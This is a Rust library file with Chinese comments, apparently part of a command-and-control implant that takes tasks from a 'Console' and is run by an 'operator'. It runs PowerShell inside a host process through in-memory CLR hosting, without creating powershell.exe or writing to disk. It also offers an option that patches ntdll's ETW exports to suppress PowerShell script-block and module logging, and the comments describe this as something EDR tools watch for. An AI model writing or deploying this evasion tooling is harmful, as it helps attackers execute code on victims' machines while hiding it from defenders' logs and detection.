//! In-process PowerShell（powershell-inline）共享库。
//!
//! 在宿主进程内托管 .NET CLR 4，从 GAC 加载 System.Management.Automation
//! 执行脚本 —— 不创建 powershell.exe 进程、不写系统 DLL 内存、不落盘
//! （stub 程序集以字节数组经 _AppDomain::Load_3 纯内存加载）。
//!
//! 被以下模块复用：
//!   - powershell 模块（Console 下发的 PowerShell 任务）
//!   - script 模块（rhai 脚本里的 powershell() 函数）
//!
//! 安全边界：CLR 宿主崩溃会影响宿主进程，因此所有托管调用串行化执行；
//! 脚本超时由 stub 内 Task.Wait(timeout) 控制，超时后 ps.Stop()。

// CLSID/IID 常量沿用 Windows SDK 命名（非 Rust 命名规范，属外部 ABI 标识）
#![allow(non_upper_case_globals)]

pub mod clr_host;
pub mod etw;

/// 在宿主进程内执行 PowerShell 脚本，返回结果字符串（JSON 或错误描述）。
pub fn execute_inline(script: &str, timeout_secs: u64) -> String {
    execute_inline_opts(script, timeout_secs, false)
}

/// 带选项的执行入口。
///
/// `suppress_etw = true` 时，在执行窗口内瞬态 patch 本进程 ntdll 的 ETW
/// 导出，抑制 PowerShell 引擎的 ScriptBlock/Module/生命周期事件日志
/// （Event Log 4104/4103/400 等）。执行结束（含错误路径）自动恢复。
///
/// 注意：patch 系统 DLL 代码段是 EDR 行为检测的高危信号，默认关闭；
/// 仅在操作员确认环境后显式开启。
pub fn execute_inline_opts(script: &str, timeout_secs: u64, suppress_etw: bool) -> String {
    // ETW 抑制器：作用域内生效，Drop 自动恢复（所有提前 return 均覆盖）
    let _etw = if suppress_etw {
        etw::EtwSuppressor::suppress()
    } else {
        None
    };
    clr_host::execute_inline(script, timeout_secs)
}
